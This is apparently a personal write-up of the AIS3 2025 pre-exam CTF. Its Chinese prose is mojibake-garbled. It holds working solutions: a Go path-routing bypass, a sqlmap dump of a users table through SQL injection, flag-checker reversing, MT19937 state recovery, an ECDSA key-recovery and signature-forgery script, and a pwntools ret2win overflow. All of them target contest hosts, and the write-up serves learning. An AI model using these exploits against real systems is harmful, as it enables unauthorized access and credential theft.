---
title: 2025 AIS3 Pre-exam Writeup 
published: 2025-07-21
description: '2025 AIS3 Pre-exam Writeup'
image: 'AIS3.png'
tags: [CTF,Writeup]
category: 'Writeup'
draft: false 
lang: ''
---

# AIS3 2025 pre-exam Writeup

# Web

## [100]Tomorin db ğŸ§
é¦–å…ˆçœ‹ä¸€ä¸‹source code:
```html
<!doctype html>
<meta name="viewport" content="width=device-width">
<pre>
<a href="cute.jpg">cute.jpg</a>
<a href="flag">flag</a>
<a href="is.jpg">is.jpg</a>
<a href="tomorin.jpg">tomorin.jpg</a>
</pre>
```

```go
package main

import "net/http"

func main() {
	http.Handle("/", http.FileServer(http.Dir("/app/Tomorin")))
	http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6", http.StatusFound)
  	})
  	http.ListenAndServe(":30000", nil)
}
```

é€™é¡Œè€ƒé»å±¬æ–¼ Web è·¯ç”±ç¹éï¼ˆRouting Bypassï¼‰ï¼Œå¯ä»¥åˆ©ç”¨ `.%2Fflag` æˆåŠŸç¹é /flag çš„ redirect handlerï¼Œç›´æ¥è®€å–éœæ…‹æª”æ¡ˆ /app/Tomorin/flagã€‚
è€Œå…¶ä»–åƒ .//flag å‰‡æœƒè¢«å°å‘ï¼Œåªæœ‰ `.%2Fflag` æœ‰æ•ˆï¼Œæ˜¯å› ç‚ºå®ƒç¹éäº† Go æ¨™æº–è·¯ç”±èˆ‡ path æ­£è¦åŒ–çš„åˆ¤æ–·ã€‚

## [100]Login Screen 1
æœ‰ä¸€å€‹ç™»å…¥ä»‹é¢ï¼Œç™»å…¥å¾Œå¯ä»¥è¼¸å…¥2FA codeå¦‚æœä»¥adminç™»å…¥ä¸”2faæ­£ç¢ºï¼Œå°±å¯ä»¥æ‹¿åˆ°flagã€‚

```php
<?php
include("init.php");

// if already logged in, redirect to dashboard
if (isset($_SESSION['username'])) {
    header('Location: dashboard.php');
    die();
}

// Handle form submission (both login and registration)
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Validation: Ensure both fields are filled
    if (empty($username) || empty($password)) {
        echo "Please enter both username and password.";
    } else {
        // Check if the username already exists
        $stmt = $db->prepare("SELECT * FROM Users WHERE username = '$username'");
        $result = $stmt->execute();
        $user = $result->fetchArray();

        if ($user) {
            // If user exists, login logic (verify password)
            if (password_verify($password, $user['password'])) {
                // Start session for the user
                $_SESSION['username'] = $username;
                $_SESSION['verified'] = 0; // Set verified to 0
                
                // redirect to dashboard
                header('Location: 2fa.php');
                die();
            } else {
                die("Invalid username or password.");
            }
        } else {
            // If user does not exist, 
            die("Invalid username or password.");
        }
    }
}
?>
```

æˆ‘å€‘å¯ä»¥çœ‹åˆ°é›–ç„¶ä½¿ç”¨äº†prepare()å‡½æ•¸å˜—è©¦é˜²SQLIï¼Œä½†æ²’æœ‰è¢«æ­£ç¢ºä½¿ç”¨ï¼Œå°è‡´$username è¢«ç›´æ¥æ’å…¥å­—ä¸²ä¸­ï¼Œæ¥ä¸‹ä¾†å°±ç”¨sqlmapä¸‹å»ç‚¸usersè¡¨ã€‚
```
sqlmap -u "http://login-screen.ctftime.uk:36368/index.php" \
--cookie="PHPSESSID=0989e32287dcbac0bc452506b6c33abe" \
--data="username=admin&password=1234" \
--batch -p username -D main -T Users --dump --threads=5
```
![è¢å¹•æ“·å–ç•«é¢ 2025-05-24 201314](https://hackmd.io/_uploads/BkyYyaSfgl.png)
æ¥ä¸‹ä¾†ç™»å…¥å°±å¯ä»¥æ‹¿åˆ°flag

# Misc

## [100] Ramen CTF
é¡Œç›®æè¿°:
```
æˆ‘åœ¨åƒ CTFï¼Œå–”ä¸å°ï¼Œæ‹‰éºµï¼Œä½†æˆ‘å¿˜è¨˜æˆ‘åœ¨å“ªé–“åº—åƒäº†ï¼ï¼ï¼ï¼Œè«‹å¹«æˆ‘æ‰¾å‡ºä¾†
(P.S. FlagFormat: AIS3{google map ä¸Šçš„åº—å®¶åç¨±:æˆ‘é»çš„å“é …åœ¨èœå–®ä¸Šçš„åç¨±})
Author: whale120
```
æƒç™¼ç¥¨QRcodeï¼Œç„¶å¾Œä¸Ÿåˆ°è²¡æ”¿éƒ¨å»æ‰¾é¤å»³è·Ÿé¤é»ã€‚


## [100] Welcome

ç›´æ¥é€ï¼Œç…§ä¸Šé¢æ‰“ã€‚

## [100] AIS3 Tiny Server - Web / Misc

é¡Œç›®æ•˜è¿°:
```
From 7890/tiny-web-server

I am reading Computer Systems: A Programmer's Perspective.

It teachers me how to write a tiny web server in C.

Non-features

No security check
The flag is at /readable_flag_somerandomstring (root directory of the server). You need to find out the flag name by yourself.

The challenge binary is the same across all AIS3 Tiny Server challenges.

Note: This is a misc (or web) challenge. Do not reverse the binary. It is for local testing only. Run ./tiny -h to see the help message. You may need to install gcc-multilib to run the binary.

Note 2: Do not use scanning tools. You don't need to scan directory.

Challenge Instancer

Warning: Instancer is not a part of the challenge, please do not attack it.

Please solve this challenge locally first then run your solver on the remote instance.

Author: pwn2ooown
```
ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯æƒ³è¾¦æ³•èƒ½åœ¨æœ¬æ©Ÿä¸Šè¨ªå•åˆ°æ ¹ç›®éŒ„å¾Œï¼Œå»é ç«¯é€£ç·šå°±å¥½ PS:é€™é¡Œè·ŸTomorin dbæœ‰ä¸€æ¨£è§£æ³•
![image](https://hackmd.io/_uploads/r1wmWarGgg.png)
```
AIS3{tInY_We8_seRVER_witH_FIl3_Br0Ws1ng_@S_@_Fe4TUrE}
```

# Reverse 
## [100] AIS3 Tiny Server - Reverse

é¡Œç›®æ•˜è¿°:
```
Find the secret flag checker in the server binary itself and recover the flag.

The challenge binary is the same across all AIS3 Tiny Server challenges.

Please download the binary from the "AIS3 Tiny Server - Web / Misc" challenge.

This challenge doesn't depend on the "AIS3 Tiny Server - Pwn" and can be solved independently.

It is recommended to solve this challenge locally.

Author: pwn2ooown
```
çœ‹ä¸€ä¸‹é—œéµcode:
```c
  if ( sub_1E20(p_s) )
    sub_1F90(fd, 200, "Flag Correct!", "Congratulations! You found the correct flag!", 0);
  else
    sub_1F90(fd, 403, "Wrong Flag", "Sorry, that's not the correct flag. Try again!", 0);
  return close(fd);
}
```

```c
_BOOL4 __cdecl sub_1E20(int a1)
{
  unsigned int index; // ecx
  char v2; // si
  char v3; // al
  int i; // eax
  char v5; // dl
  _BYTE key[10]; // [esp+7h] [ebp-49h] BYREF
  _DWORD enc[11]; // [esp+12h] [ebp-3Eh]
  __int16 v9; // [esp+3Eh] [ebp-12h]

  index = 0;
  v2 = 51;
  v9 = 20;
  v3 = 'r';
  enc[0] = 1480073267;
  enc[1] = 1197221906;
  enc[2] = 254628393;
  enc[3] = 920154;
  enc[4] = 1343445007;
  enc[5] = 874076697;
  enc[6] = 1127428440;
  enc[7] = 1510228243;
  enc[8] = 743978009;
  enc[9] = 54940467;
  enc[10] = 1246382110;
  qmemcpy(key, "rikki_l0v3", sizeof(key));
  while ( 1 )
  {
    *(enc + index++) = v2 ^ v3;
    if ( index == 45 )
      break;
    v2 = *(enc + index);
    v3 = key[index % 0xA];
  }
  for ( i = 0; i != 45; ++i )    //æª¢æŸ¥é•·åº¦ç‚º 45
  {
    v5 = *(a1 + i);
    if ( !v5 || v5 != *(enc + i) )    //æ¯å€‹å­—å…ƒéƒ½è¦å®Œå…¨ç›¸ç¬¦
      return 0;
  }
  return *(a1 + 45) == 0;    //æœ€å¾Œæ˜¯ null (\0) çµå°¾
}
```
é€†å‡ºä¾†å°±ä¸€ç›®äº†ç„¶ï¼Œæ¥è‘—ç…§ä»–é‚è¼¯å¯«exp.pyå°±å¥½
```python
#exp.py
v8_values = [
    1480073267,    
    1197221906,    
    254628393,     
    920154,        
    1343445007,    
    874076697,     
    1127428440,    
    1510228243,   
    743978009,   
    54940467,   
    1246382110  
]

v8_bytes = bytearray()
for value in v8_values:
    v8_bytes.extend(value.to_bytes(4, byteorder='little'))

v8_bytes.append(0x14)

original_bytes = bytearray(v8_bytes)
processed_bytes = bytearray(45)

key = b"rikki_l0v3"

index = 0
v2 = 0x33
v3 = key[0]

while True:
    processed_bytes[index] = v2 ^ v3
    index += 1
    if index >= 45:
        break
    v2 = original_bytes[index]
    v3 = key[index % 10]

flag = processed_bytes.decode('latin-1')
print("AIS3-Flag:", flag)
#AIS3-Flag: AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}
```

## [100] web flag checker
è¨ªå• `http://chals1.ais3.org:29998/`æœƒè¼‰å…¥ä¸€å€‹ç°¡å–®çš„ HTML é é¢ï¼Œä¸¦å¼•å…¥index.jså’Œindex.wasmé é¢æœ‰ä¸€å€‹è¼¸å…¥æ¬„ä½èˆ‡æŒ‰éˆ•ã€‚æˆ‘å€‘çš„ç›®æ¨™æ˜¯æ‰¾å‡ºè¼¸å…¥å“ªä¸€çµ„ flag æ‰èƒ½é€šéé©—è­‰ã€‚

æ‰“é–‹ index.js å¯ä»¥è§€å¯Ÿåˆ° JavaScript é€é fetch('index.wasm') è¼‰å…¥ WebAssembly æ¨¡çµ„ä¸¦åŸ·è¡Œæª¢æŸ¥ï¼š
```js
const val = document.getElementById('flagInput').value;
stringToUTF8(val, $0, 64);
```
ä»£è¡¨ä½¿ç”¨è€…è¼¸å…¥çš„ flag æœƒå¯«å…¥ WebAssembly è¨˜æ†¶é«”çš„æŸå€‹ä½å€ï¼Œæ¥è‘—æœƒç”±WebAssemblyæ¨¡çµ„é€²è¡Œæª¢æŸ¥ã€‚

ä½¿ç”¨ wabt çš„ wasm2wat å·¥å…·å¯ä»¥é‚„åŸï¼š`wasm2wat index.wasm -o index.wat`


åœ¨ .wat æª”æ¡ˆä¸­ï¼Œå¯ä»¥æ‰¾åˆ°æ ¸å¿ƒé©—è­‰å‡½æ•¸ï¼Œä¾‹å¦‚ï¼š
```wat
(func $flagchecker (param $ptr i32) (result i32)
  ;; å°è¼¸å…¥é€²è¡Œæ“ä½œ
)
```


é€²ä¸€æ­¥è¿½è¹¤ç·¨è­¯å¾Œçš„ C å°æ‡‰ç¨‹å¼ç¢¼ï¼Œå¯ç™¼ç¾è¼¸å…¥æœƒè¢«åˆ†æˆæœ‰å¤§é‡ i64.const æˆ– i64.store çš„ç‰‡æ®µï¼Œé€éè¼ªè½‰ï¼ˆrotate_left) èˆ‡è¨˜æ†¶é«”å¸¸æ•¸åšæ¯”å°ï¼Œç„¶å¾Œå˜—è©¦é€†è‘—æ¨å›ä¾†ã€‚
```c
// å–å‡ºè¼¸å…¥çš„ 64-bit å€¼ï¼Œåšå·¦æ—‹è½‰å¾Œæ¯”å°
rotated_input = rotate_left(*(input_ptr + offset), shift);
if (rotated_input != *(memory + const_offset)) return 0;
```
`AIS3{W4SM_R3v3rsing_w17h_g0_4pp_39229dd}`

## [100] A_simple_snake_game
é¡Œç›®æ•˜è¿°:
```
Here is A very interesting Snake game. If no one beat this game the world will be destory in 30 seconds. Now, Chenallger , It's your duty to beat the game, save the world.

author: Aukro
```
é€™é¡Œæˆ‘èŠ±è¶…å¤šæ™‚é–“åœ¨è§£ï¼Œå…¶å¯¦é¡Œç›®ä¸é›£ï¼Œå°±æ˜¯æ²’æœ‰æŠ“åˆ°æ­£ç¢ºæ–¹å‘ï¼Œä»¥ä¸‹æ˜¯æˆ‘æ‰€å˜—è©¦éçš„æ–¹å‘ï¼Œå°æ‡‰åˆ°é¡Œç›®èªªçš„beat the game:

1.patchæ‰wallã€border
2.patchæ‰æ­»äº¡è®Šæˆç„¡æ•µæ¨¡å¼
3.è®“è›‡èº«è®Šè¶…å¤§å¯ä»¥è¼•æ˜“ç©å®ŒéŠæˆ²
4.patchæ‰åˆ†æ•¸
5.æ’è¶…éé¡Œç›®èªªçš„30 seconds

ä½†æœ€å¾Œå…¶å¯¦ç™¼ç¾åœ¨drawText()å¯ä»¥ç™¼ç¾æœ‰å€‹å¥‡æ€ªæ¢ä»¶ï¼Œpatchå†è·‘å°±getflagäº†
https://github.com/jcalvarezj/snake/blob/master/Snake.cpp
é€™é‚Šæˆ‘é‚„æœ‰æ‰¾åˆ°é¡Œç›®åŸç¢¼ï¼Œå°±ä¸æ”¾åç·¨è­¯äº†

# Crypto

## [100] Stream
source code:
```
from random import getrandbits
import os
from hashlib import sha512
from flag import flag

def hexor(a: bytes, b: int):
    return hex(int.from_bytes(a)^b**2)

for i in range(80):
    print(hexor(sha512(os.urandom(True)).digest(), getrandbits(256)))

print(hexor(flag, getrandbits(256)))
```
çœ‹åˆ°é¡Œç›®æˆ‘åŸæœ¬æƒ³èªªå¯ä»¥åˆ©ç”¨MT19937çš„624çµ„æ¨£æœ¬ä¾†é æ¸¬ä¸‹ä¸€çµ„éš¨æ©Ÿå€¼ï¼Œä½†ç™¼ç¾åªæœƒçµ¦80çµ„ï¼ŒåŸæœ¬åˆ°é€™é‚Šå°±å¡ä½äº†ï¼Œä½†å¾Œä¾†å»googleçŸ¥é“624çµ„æŒ‡çš„æ˜¯32-bits è€Œé¡Œç›®çµ¦çš„æ˜¯256bitsï¼Œæ‰€ä»¥æ¯å€‹hexå…¶å¯¦æ˜¯æœ‰8å€‹32-bitsï¼Œ8*80=640ï¼Œè¶…é624å³ç¬¦åˆæ¢ä»¶ï¼Œæ¥ä¸‹ä¾†åŸæœ¬æƒ³å»githubæŒ–å¥½ç”¨çš„MT19937 solver codeä½†éƒ½æ‰¾ä¸åˆ°ï¼Œå°±ç”¨AIç”Ÿæ¶æ§‹è·ŸAI+äººå·¥debugã€‚expå¦‚ä¸‹:
```py
#exp.py
import sys, math, hashlib, random

hex_list = [
    # 80çµ„ enc_random_hex
    # 1çµ„ enc_flag_hex
]

def recover_flag_from_hex_lines(hex_lines):
    cipher = hex_lines[-1]
    decoys = hex_lines[:-1]

    digest_ints = [int.from_bytes(hashlib.sha512(bytes([i])).digest(), 'big') for i in range(256)]

    random_outputs = []
    for val in decoys:
        for b in range(256):
            candidate = val ^ digest_ints[b]
            root = math.isqrt(candidate)
            if root * root == candidate and root.bit_length() <= 256:
                random_outputs.append(root)
                break
        else:
            raise ValueError("error")

    mt_outputs = []
    for r in random_outputs:
        for i in range(8):
            mt_outputs.append((r >> (32 * i)) & 0xFFFFFFFF)

    MASK_B = 0x9D2C5680
    MASK_C = 0xEFC60000

    def unshift_right(value, shift):
        result = value
        for _ in range(5):
            result = value ^ (result >> shift)
        return result & 0xFFFFFFFF

    def unshift_left(value, shift, mask):
        result = value
        for _ in range(5):
            result = value ^ ((result << shift) & mask)
        return result & 0xFFFFFFFF

    state = []
    for y in mt_outputs[:624]:
        y = unshift_right(y, 18)
        y = unshift_left(y, 15, MASK_C)
        y = unshift_left(y, 7, MASK_B)
        y = unshift_right(y, 11)
        state.append(y)

    rng = random.Random()
    rng.setstate((3, tuple(state + [0]), None))

    for _ in range(80):
        rng.getrandbits(256)

    B = rng.getrandbits(256)

    flag_int = cipher ^ (B * B)
    flag_bytes = flag_int.to_bytes(64, 'big').rstrip(b"\x00")
    return flag_bytes.decode()

print("Recovered flag:", recover_flag_from_hex_lines(hex_list))
#AIS3{no_more_junks...plz}
```

## [100] SlowECDSA
source code:
```py
#!/usr/bin/env python3

import hashlib, os
from ecdsa import SigningKey, VerifyingKey, NIST192p
from ecdsa.util import number_to_string, string_to_number
from Crypto.Util.number import getRandomRange
from flag import flag

FLAG = flag

class LCG:
    def __init__(self, seed, a, c, m):
        self.state = seed
        self.a = a
        self.c = c
        self.m = m

    def next(self):
        self.state = (self.a * self.state + self.c) % self.m
        return self.state

curve = NIST192p
sk = SigningKey.generate(curve=curve)
vk = sk.verifying_key
order = sk.curve.generator.order()

lcg = LCG(seed=int.from_bytes(os.urandom(24), 'big'), a=1103515245, c=12345, m=order)

def sign(msg: bytes):
    h = int.from_bytes(hashlib.sha1(msg).digest(), 'big') % order
    k = lcg.next()
    R = k * curve.generator
    r = R.x() % order
    s = (pow(k, -1, order) * (h + r * sk.privkey.secret_multiplier)) % order
    return r, s

def verify(msg: str, r: int, s: int):
    h = int.from_bytes(hashlib.sha1(msg.encode()).digest(), 'big') % order
    try:
        sig = number_to_string(r, order) + number_to_string(s, order)
        return vk.verify_digest(sig, hashlib.sha1(msg.encode()).digest())
    except:
        return False

example_msg = b"example_msg"
print("==============SlowECDSA===============")
print("Available options: get_example, verify")

while True:
    opt = input("Enter option: ").strip()

    if opt == "get_example":
        print(f"msg: {example_msg.decode()}")
        example_r, example_s = sign(example_msg)
        print(f"r: {hex(example_r)}")
        print(f"s: {hex(example_s)}")

    elif opt == "verify":
        msg = input("Enter message: ").strip()
        r = int(input("Enter r (hex): ").strip(), 16)
        s = int(input("Enter s (hex): ").strip(), 16)

        if verify(msg, r, s):
            if msg == "give_me_flag":
                print("âœ… Correct signature! Here's your flag:")
                print(FLAG.decode())
            else:
                print("âœ”ï¸ Signature valid, but not the target message.")
        else:
            print("âŒ Invalid signature.")

    else:
        print("Unknown option. Try again.")

```
è©²é¡Œå¯¦ä½œäº†ä¸€å€‹åŸºæ–¼æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸çš„æ•¸ä½ç°½åç®—æ³•ï¼Œä½†ä½¿ç”¨LCGä¾†ç”¢ç”Ÿæ¯æ¬¡ç°½ç« ç”¨çš„éš¨æ©Ÿæ•¸kï¼Œé€™å°è‡´åªè¦å–å¾—å¹¾ç­†ç°½ç« æ¨£æœ¬ï¼Œå°±å¯ä»¥é æ¸¬ä¸‹ä¸€æ¬¡ç°½ç« æ‰€ä½¿ç”¨çš„ké€²è€Œæ¨å‡ºä½¿ç”¨è€…çš„ç§é‘°dã€‚

æ”»æ“Šæµç¨‹:
1.è…³æœ¬åˆ©ç”¨ LCG Nonce ç”Ÿæˆçš„æ¼æ´ä¾†æ¢å¾©ä¼ºæœå™¨çš„ç§é‘° (sk)ï¼Œç„¶å¾Œå½é€ å°è¨Šæ¯ "give_me_flag" çš„ç°½ç« ã€‚
2.æ ¹æ“š ECDSA åŸç†ï¼ŒæŠŠæ¯çµ„ç°½ç« è½‰æ›ç‚º`k_i = a_i + b_i * sk mod n`
3.ç”¨ä»£æ•¸æ¶ˆå…ƒçš„æ–¹å¼ï¼Œå¾é€£çºŒçš„(k1, k2, k3, k4)ä¸­æ¶ˆå»LCGçš„aã€cï¼Œå»ºç«‹ä¸€å€‹åªå« sk çš„äºŒæ¬¡æ–¹ç¨‹å¼ã€‚
4.ä¾åºæ¸¬è©¦æ¯å€‹skå€¼ï¼Œæ ¹æ“šk1,k2,k3æ¨å‡ºLCGçš„åƒæ•¸aã€cï¼Œä¸¦é©—è­‰å®ƒå€‘æ˜¯å¦èƒ½æ­£ç¢ºç®—å‡ºk4ã€‚
5.æ‰¾åˆ°aã€cå¾Œåˆ©ç”¨LCGæ¨æ¸¬å‡ºä¸‹ä¸€å€‹Nonce k5ï¼Œç„¶å¾Œä½¿ç”¨å·²çŸ¥çš„ç§é‘°skï¼Œå°"give_me_flag"è¨Šæ¯è£½ä½œåˆæ³•ç°½ç« (r5, s5)ã€‚
6.é€å‡º"give_me_flag"å’Œå½é€ çš„(r5, s5)ã€‚
```py
#!/usr/bin/env python3
import socket
import hashlib

HOST = 'chals1.ais3.org'
PORT = 19000

# NIST P-192 æ›²ç·šåƒæ•¸
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFF
n = 0xFFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22831
a_curve = p - 3
b_curve = int('64210519E59C80E70FA7E9AB72243049FEB8DEECC146B9B1', 16)
Gx = int('188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012', 16)
Gy = int('07192B95FFC8DA78631011ED6B24CDD573F977A11E794811', 16)
G = (Gx, Gy)

def ec_add(P, Q):
    if P is None: return Q
    if Q is None: return P
    (x1, y1), (x2, y2) = P, Q
    if x1 == x2:
        if (y1 + y2) % p == 0: return None
        lam = (3 * x1 * x1 + a_curve) * pow(2 * y1, -1, p) % p
    else:
        lam = (y2 - y1) * pow(x2 - x1, -1, p) % p
    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    return (x3, y3)

def ec_mul(k, P):
    R = None
    while k:
        if k & 1:
            R = ec_add(R, P)
        P = ec_add(P, P)
        k >>= 1
    return R

def H(msg):
    return int(hashlib.sha1(msg.encode()).hexdigest(), 16) % n

def recv_until(s, pat):
    data = b""
    while True:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
        if pat.encode() in data:
            break
    return data.decode(errors="ignore")

def send_line(s, line):
    s.send((line + "\n").encode())

def mod_sqrt(a, p):
    if a == 0: return 0
    if pow(a, (p - 1) // 2, p) != 1: return None
    q, s = p - 1, 0
    while q % 2 == 0:
        q //= 2; s += 1
    z = 2
    while pow(z, (p - 1) // 2, p) == 1:
        z += 1
    c = pow(z, q, p)
    r = pow(a, (q + 1) // 2, p)
    t = pow(a, q, p)
    m = s
    while t != 1:
        i, t2 = 1, pow(t, 2, p)
        while pow(t2, 2 ** (i - 1), p) != 1:
            i += 1
        b = pow(c, 2 ** (m - i - 1), p)
        m = i
        c = (b * b) % p
        t = (t * c) % p
        r = (r * b) % p
    return r

# å»ºç«‹é€£ç·š
s = socket.create_connection((HOST, PORT))
s.settimeout(2)

recv_until(s, "option:")

sigdata = []
for _ in range(4):
    send_line(s, "get_example")
    response = recv_until(s, "option:")
    lines = response.splitlines()
    r_line = next((l for l in lines if l.startswith("r:")), "")
    s_line = next((l for l in lines if l.startswith("s:")), "")
    r = int(r_line.split(":", 1)[1].strip(), 16)
    ss = int(s_line.split(":", 1)[1].strip(), 16)
    sigdata.append((H("example_msg"), r, ss))

# è§£å¯†æµç¨‹
(h1, r1, s1), (h2, r2, s2), (h3, r3, s3), (h4, r4, s4) = sigdata
inv = lambda x: pow(x, -1, n)
a1 = (h1 * inv(s1)) % n; b1 = (r1 * inv(s1)) % n
a2 = (h2 * inv(s2)) % n; b2 = (r2 * inv(s2)) % n
a3 = (h3 * inv(s3)) % n; b3 = (r3 * inv(s3)) % n
a4 = (h4 * inv(s4)) % n; b4 = (r4 * inv(s4)) % n

e = (a3 - a2) % n; f = (b3 - b2) % n
g = (a3 - a1) % n; h_ = (b3 - b1) % n
i_ = (a2 - a1) % n; j_ = (b2 - b1) % n
k_ = (a2 - a4) % n; l_ = (b2 - b4) % n

A2 = (f * h_ + j_ * l_) % n
A1 = (e * h_ + f * g + i_ * l_ + j_ * k_) % n
A0 = (e * g + i_ * k_) % n

disc = (A1 * A1 - 4 * A2 * A0) % n
sqrt_disc = mod_sqrt(disc, n)
if sqrt_disc is None:
    print("[!] ç„¡æ³•é–‹æ ¹è™Ÿ")
    exit()

x1 = (-A1 + sqrt_disc) * inv(2 * A2) % n
x2 = (-A1 - sqrt_disc) * inv(2 * A2) % n

priv_key = None
for x in [x1, x2]:
    k1 = (h1 + x * r1) * inv(s1) % n
    k2 = (h2 + x * r2) * inv(s2) % n
    k3 = (h3 + x * r3) * inv(s3) % n
    if (k2 - k1) == 0:
        continue
    a_lcg = (k3 - k2) * inv(k2 - k1) % n
    c_lcg = (k2 - a_lcg * k1) % n
    k4 = (h4 + x * r4) * inv(s4) % n
    if (a_lcg * k3 + c_lcg - k4) % n == 0:
        priv_key = x
        break

if priv_key is None:
    print("[x] ç§é‘°é‚„åŸå¤±æ•—")
    exit()

print(f"[+] æ‰¾åˆ°ç§é‘°: {hex(priv_key)}")
print(f"[+] LCG åƒæ•¸: a = {hex(a_lcg)}, c = {hex(c_lcg)}")

# å½é€ ç°½ç« 
k5 = (a_lcg * k4 + c_lcg) % n
h_flag = H("give_me_flag")
R = ec_mul(k5, G)
r5 = R[0] % n
s5 = (inv(k5) * (h_flag + priv_key * r5)) % n

print("[+] å½é€ ç°½ç« æˆåŠŸ:")
print(f"    r = {hex(r5)}")
print(f"    s = {hex(s5)}")

# é€å‡º verify
send_line(s, "verify")
recv_until(s, "message:")
send_line(s, "give_me_flag")
recv_until(s, "r (hex):")
send_line(s, hex(r5))
recv_until(s, "s (hex):")
send_line(s, hex(s5))

# è®€å–çµæœ
final_response = recv_until(s, "option:")
print("[+] ä¼ºæœå™¨å›æ‡‰:")
print(final_response)

# é¡¯ç¤º flagï¼ˆå¦‚æœæœ‰ï¼‰
for line in final_response.splitlines():
    if "AIS3{" in line:
        print("[ğŸ‰] Flag:", line.strip())
#AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}
```
![è¢å¹•æ“·å–ç•«é¢ 2025-05-26 141358](https://hackmd.io/_uploads/r1aAD1IGeg.png)

# Pwn

## [100]Welcome to the World of Ave MujicağŸŒ™

é¡Œç›®æè¿°:
```
Flag åœ¨ /flagï¼Œé€™é¡Œçš„ flag æœ‰ Unicode å­—å…ƒï¼Œè«‹æ‰¾åˆ° flag ä¹‹å¾Œç›´æ¥æäº¤åˆ°å¹³å°ä¸Šï¼Œå¦‚æœå› ç‚ºä¸€äº›ç„å­¸å•é¡Œ CTFd é€ä¸éè«‹ base64 flag å‡ºä¾†ç”¨ CyberChef decode æ‡‰è©²å°±å¯ä»¥äº†

Instancer

è«‹å…ˆåœ¨æœ¬åœ°æ¸¬è©¦ä¸¦ç¢ºå®šèƒ½æˆåŠŸæ”»æ“Šå¾Œå†é–‹ instance

è‹¥åŒæ™‚åƒåŠ å…©å ´æ¯”è³½ï¼Œè¼¸å…¥ä»»æ„ä¸€å€‹ CTFd çš„ token çš†å¯å•Ÿå‹• instance

Instancer ä¸¦éé¡Œç›®çš„ä¸€éƒ¨åˆ†ï¼Œè«‹å‹¿æ”»æ“Š Instancerã€‚ç™¼ç¾å•é¡Œè«‹å›å ± admin

Author: pwn2ooown
```
source code:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[143]; // [rsp+0h] [rbp-A0h] BYREF
  char s[8]; // [rsp+8Fh] [rbp-11h] BYREF
  unsigned __int8 int8; // [rsp+97h] [rbp-9h]
  char *v7; // [rsp+98h] [rbp-8h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  printf("\x1B[2J\x1B[1;1H");
  printf("\x1B[31m");
  printf("%s", (const char *)banner);
  puts(&byte_402A78);
  puts(&byte_402AB8);
  fgets(s, 8, stdin);
  v7 = strchr(s, 10);
  if ( v7 )
    *v7 = 0;
  if ( strcmp(s, "yes") )
  {
    puts(&byte_402AE8);
    exit(1);
  }
  printf(&byte_402B20);
  int8 = read_int8();
  printf(&byte_402B41);
  read(0, buf, int8);
  return 0;
}
```
```c
int Welcome_to_the_world_of_Ave_Mujica()
{
  puts(&s);
  puts(&byte_402990);
  puts(&byte_4029B4);
  puts(&byte_4029C3);
  puts(&byte_4029D2);
  puts(&byte_4029E1);
  puts(&byte_4029FC);
  puts(&byte_402A15);
  return execve("/bin/sh", 0, 0);
}
```
å¯ä»¥ç™¼ç¾read_int8()å¯ä»¥è¼¸å…¥0~255çš„æ•¸å­—ï¼Œä½†read(0,buf,int8)æ²’æœ‰æª¢æŸ¥int8æ˜¯å¦è¶…ébufå¤§å°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨é€™é»ret2winã€‚
```py
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

welcome_addr = 0x401256

#p = process('./chal')
p=remote("chals1.ais3.org",60877)

p.sendlineafter(b"?", b"yes")

p.sendlineafter(b": ", b"-1")


payload = flat(
    b'A' * 168,
    welcome_addr
)

p.sendlineafter(b": ", payload)

p.interactive()
#AIS3{Ave MujicağŸ­å°‡å¥‡è¹Ÿå¸¶å…¥æ—¥å¸¸ä¸­ğŸ›(FortunağŸ’µğŸ’µğŸ’µ)...Ave MujicağŸ­ç‚ºä½ ç»ä¸Šæ…ˆæ‚²æ†æ†«âœï¸(LacrimağŸ˜­ğŸ¥²ğŸ’¦)..._ad15e425293ef05414d129082e0c9154}
```
# æœ€çµ‚è§£é¡Œ
![è¢å¹•æ“·å–ç•«é¢ 2025-05-26 170121](https://hackmd.io/_uploads/H1J9ikIMle.png)